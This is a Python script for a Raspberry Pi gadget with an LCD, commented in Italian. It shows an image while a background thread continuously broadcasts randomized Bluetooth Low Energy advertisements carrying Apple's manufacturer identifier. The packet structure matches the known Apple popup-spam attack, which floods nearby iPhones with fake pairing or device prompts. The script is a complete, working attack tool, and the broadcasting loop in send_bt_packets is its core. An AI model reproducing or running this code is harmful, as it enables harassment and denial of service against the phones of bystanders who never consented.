import random
import bluetooth._bluetooth as bluez
import struct
import os
import socket
import array
import fcntl
from errno import EALREADY
import RPi.GPIO as GPIO
from PIL import Image
import LCD_1in44
import time
import threading  # Aggiungi questa linea per importare il modulo threading

# Pin setup (assumi che KEY_PRESS_PIN sia già definito nel tuo menu.py)
KEY_PRESS_PIN = 13

# Initialize GPIO (assumi che GPIO sia già inizializzato nel tuo menu.py)
GPIO.setmode(GPIO.BCM)
GPIO.setup(KEY_PRESS_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)

# Initialize LCD (assumi che disp sia già inizializzato nel tuo menu.py)
disp = LCD_1in44.LCD()
Lcd_ScanDir = LCD_1in44.SCAN_DIR_DFT
disp.LCD_Init(Lcd_ScanDir)
disp.LCD_Clear()

def show_image_and_wait():
    try:
        # Load and resize the image
        image_path = "bkat.png"
        if not os.path.exists(image_path):
            print(f"Image file {image_path} not found")
            return

        image = Image.open(image_path)
        image = image.resize((128, 128))  # Resize image to fit the display

        # Show the image on LCD
        disp.LCD_ShowImage(image, 0, 0)

        # Wait for button press to exit
        while GPIO.input(KEY_PRESS_PIN) == 1:
            time.sleep(0.1)  # Polling delay

        # Clear the LCD display
        disp.LCD_Clear()
        # Reopen menu
        os.system("sudo python3 menu.py")
    except Exception as e:
        print(f"An error occurred: {e}")

def send_bt_packets(sock):
    try:
        while True:
            types = [0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0]
            bt_packet = (16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, types[random.randint(0, len(types) - 1)],
                         random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), 0x00, 0x00, 0x10,
                         random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            struct_params = [20, 20, 3, 0, 0, 0, 0, 0, 0, 0, 0, 7, 0]
            cmd_pkt = struct.pack("<HHBBB6BBB", *struct_params)
            bluez.hci_send_cmd(sock, 0x08, 0x0006, cmd_pkt)
            cmd_pkt = struct.pack("<B", 0x01)
            bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)
            cmd_pkt = struct.pack("<B%dB" % len(bt_packet), len(bt_packet), *bt_packet)
            bluez.hci_send_cmd(sock, 0x08, 0x0008, cmd_pkt)

            time.sleep(1)  # Adjust this delay to increase or decrease packet sending speed

            cmd_pkt = struct.pack("<B", 0x00)
            bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)

    except KeyboardInterrupt:
        cmd_pkt = struct.pack("<B", 0x00)
        bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)
    except Exception as e:
        print(f"An error occurred: {e}")
        cmd_pkt = struct.pack("<B", 0x00)
        bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)

def main():
    hci_sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
    req_str = struct.pack("H", 0)
    request = array.array("b", req_str)

    try:
        fcntl.ioctl(hci_sock.fileno(), bluez.HCIDEVUP, request[0])
    except IOError as e:
        if e.errno == EALREADY:
            pass
        else:
            raise
    finally:
        hci_sock.close()

    try:
        sock = bluez.hci_open_dev(0)
    except Exception as e:
        print(f"Unable to connect to Bluetooth hardware 0: {e}")
        return

    # Spawn a thread to send Bluetooth packets at high speed
    send_thread = threading.Thread(target=send_bt_packets, args=(sock,))
    send_thread.start()

    try:
        # After starting the send thread, show the image and wait for exit
        show_image_and_wait()
    except KeyboardInterrupt:
        print("\nProgram terminated by user")
    finally:
        GPIO.cleanup()  # Clean up GPIO pins on program exit

if __name__ == "__main__":
    main()
